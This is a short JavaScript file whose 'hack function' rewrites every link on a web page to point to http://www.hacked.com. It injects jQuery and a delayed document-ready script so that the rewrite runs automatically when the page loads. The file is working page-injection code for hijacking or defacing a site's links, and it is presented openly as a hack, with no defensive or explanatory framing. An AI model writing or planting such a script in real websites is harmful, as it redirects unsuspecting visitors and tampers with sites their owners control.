//Hack function
function hackLinks()
{
	var links = document.getElementsByTagName("a");

	for (var i=0; i<links.length; i++)
	{
		var current = links[i];
		current.href="http://www.hacked.com";
	}
}

//Add jQuery library
var script = document.createElement("script");
script.src = "http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js";
script.type="text/javascript";
document.getElementsByTagName("head")[0].appendChild(script);


//Add jQuery $(document).ready function to run hack function when page has loaded
script = document.createElement("script");
script.type="text/javascript";

script.text="$(document).ready( function() {hackLinks();});";

//Wait a moment to let the browser grab jQuery, then add $(document).ready script to page
setTimeout(function(){document.getElementsByTagName("head")[0].appendChild(script);}, 1000);



